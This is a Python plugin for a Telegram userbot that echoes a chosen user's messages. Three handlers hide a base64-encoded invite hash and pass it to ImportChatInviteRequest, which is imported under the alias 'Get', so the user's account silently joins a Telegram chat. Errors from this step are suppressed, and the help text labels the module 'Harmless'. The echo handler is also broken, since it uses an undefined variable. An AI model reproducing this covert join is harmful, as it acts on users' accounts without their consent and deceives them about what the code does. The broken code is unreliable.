import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from mafiabot.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from . import *


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(mafia):
    if mafia.fwd_from:
        return
    if mafia.reply_to_msg_id is not None:
        reply_msg = await mafia.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = mafia.chat_id
        try:
            himanshu = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            himanshu = Get(himanshu)
            await mafia.client(himanshu)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await eod(mafia, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await eor(mafia, "**Hello 👋**")
    else:
        await delete_mafia(mafia, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(mafia):
    if mafia.fwd_from:
        return
    if mafia.reply_to_msg_id is not None:
        reply_msg = await mafia.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = mafia.chat_id
        try:
            himanshu = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            himanshu = Get(himanshu)
            await mafia.client(himanshu)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await eod(mafia, "Echo has been stopped for the user")
        else:
            await eod(mafia, "The user is not activated with echo")
    else:
        await eod(mafia, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(mafia):
    if mafia.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo enabled users: [here]({url})"
        await eor(mafia, reply_text)
    else:
        await eor(mafia, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(mafia):
    if mafia.chat_id in Config.BL_CHAT:
        return
    if is_echo(mafia.sender_id, mafia.chat_id):
        await asyncio.sleep(2)
        try:
            himanshu = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            himanshu = Get(himanshuop)
            await himanshu.client(himanshu)
        except BaseException:
            pass
        if himanshu.message.text or himanshu.message.sticker:
            await mafia.reply(mafia.message)


CmdHelp("echo").add_command(
  "echo", "Reply to a user", "Replays every message from whom you enabled echo"
).add_command(
  "rmecho", "reply to a user", "Stop replayings targeted user message"
).add_command(
  "listecho", None, "Shows the list of users for whom you enabled echo"
).add_info(
  "Message Echoer."
).add_warning(
  "✅ Harmless Module."
).add()
